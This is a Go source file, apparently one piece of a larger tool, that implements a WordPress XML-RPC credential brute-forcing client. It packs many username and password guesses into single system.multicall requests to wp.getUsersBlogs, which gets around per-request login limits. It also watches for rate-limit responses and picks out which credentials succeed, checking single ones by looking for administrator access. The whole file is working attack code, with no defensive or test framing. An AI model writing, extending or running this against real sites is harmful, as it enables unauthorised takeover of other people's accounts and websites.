package main

import (
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type CredentialResult struct {
	Success bool
}

type MulticallResponse struct {
	StatusCode  int
	RateLimited bool
	ParseError  error
	AllFailed   bool
	Results     []CredentialResult
}

type WPClient struct {
	url        string
	httpClient *http.Client
}

func NewWPClient(targetURL string, timeout time.Duration) *WPClient {
	xmlRpcURL := strings.TrimRight(targetURL, "/") + "/xmlrpc.php"
	return &WPClient{
		url: xmlRpcURL,
		httpClient: &http.Client{
			Timeout: timeout,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 100,
				IdleConnTimeout:     90 * time.Second,
				DisableCompression:  false,
			},
		},
	}
}

func (c *WPClient) URL() string { return c.url }

func (c *WPClient) HealthCheck() error {
	payload := `<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params/></methodCall>`
	req, err := http.NewRequest("POST", c.url, strings.NewReader(payload))
	if err != nil {
		return fmt.Errorf("error al crear la solicitud de verificación de estado: %w", err)
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("User-Agent", userAgent)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("el objetivo no es accesible: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusMethodNotAllowed {
		return fmt.Errorf("xmlrpc.php devolvio 405")
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("xmlrpc.php devolvio HTTP %d", resp.StatusCode)
	}
	return nil
}

func buildMulticallPayload(creds []Credential) string {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0"?>`)
	b.WriteString(`<methodCall>`)
	b.WriteString(`<methodName>system.multicall</methodName>`)
	b.WriteString(`<params><param><value><array><data>`)
	for _, cred := range creds {
		b.WriteString(`<value><struct>`)
		b.WriteString(`<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>`)
		b.WriteString(`<member><name>params</name><value><array><data>`)
		b.WriteString(`<value><string>`)
		xml.EscapeText(&b, []byte(cred.Username))
		b.WriteString(`</string></value>`)
		b.WriteString(`<value><string>`)
		xml.EscapeText(&b, []byte(cred.Password))
		b.WriteString(`</string></value>`)
		b.WriteString(`</data></array></value></member>`)
		b.WriteString(`</struct></value>`)
	}
	b.WriteString(`</data></array></value></param></params>`)
	b.WriteString(`</methodCall>`)
	return b.String()
}

func parseMulticallResponse(body []byte, statusCode int) *MulticallResponse {
	result := &MulticallResponse{StatusCode: statusCode}
	bodyStr := string(body)

	if strings.Contains(bodyStr, "<fault>") {
		result.AllFailed = true
		return result
	}

	parts := strings.Split(bodyStr, "<value><struct>")
	if len(parts) <= 1 {
		result.AllFailed = true
		return result
	}

	for i := 1; i < len(parts); i++ {
		part := parts[i]
		if strings.Contains(part, "faultCode") {
			result.Results = append(result.Results, CredentialResult{Success: false})
		} else if strings.Contains(part, "/struct>") {
			result.Results = append(result.Results, CredentialResult{Success: true})
		}
	}

	return result
}

func (c *WPClient) SendMulticall(creds []Credential) (*MulticallResponse, error) {
	payload := buildMulticallPayload(creds)
	req, err := http.NewRequest("POST", c.url, strings.NewReader(payload))
	if err != nil {
		return nil, fmt.Errorf("error al crear la solicitud: %w", err)
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("User-Agent", userAgent)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("fallo la solicitud HTTP: %w", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error al leer la respuesta: %w", err)
	}
	if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == http.StatusServiceUnavailable {
		return &MulticallResponse{StatusCode: resp.StatusCode, RateLimited: true}, nil
	}
	if resp.StatusCode != http.StatusOK {
		return &MulticallResponse{StatusCode: resp.StatusCode}, nil
	}
	return parseMulticallResponse(body, resp.StatusCode), nil
}

func (c *WPClient) VerifyCredential(username, password string) (bool, error) {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0"?>`)
	b.WriteString(`<methodCall><methodName>wp.getUsersBlogs</methodName>`)
	b.WriteString(`<params>`)
	b.WriteString(`<param><value><string>`)
	xml.EscapeText(&b, []byte(username))
	b.WriteString(`</string></value></param>`)
	b.WriteString(`<param><value><string>`)
	xml.EscapeText(&b, []byte(password))
	b.WriteString(`</string></value></param>`)
	b.WriteString(`</params></methodCall>`)
	req, err := http.NewRequest("POST", c.url, strings.NewReader(b.String()))
	if err != nil {
		return false, fmt.Errorf("error al crear la peticion: %w", err)
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("User-Agent", userAgent)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	bodyStr := string(body)
	if strings.Contains(bodyStr, "<fault>") {
		return false, nil
	}
	if strings.Contains(bodyStr, "isAdmin") {
		return true, nil
	}
	return false, nil
}
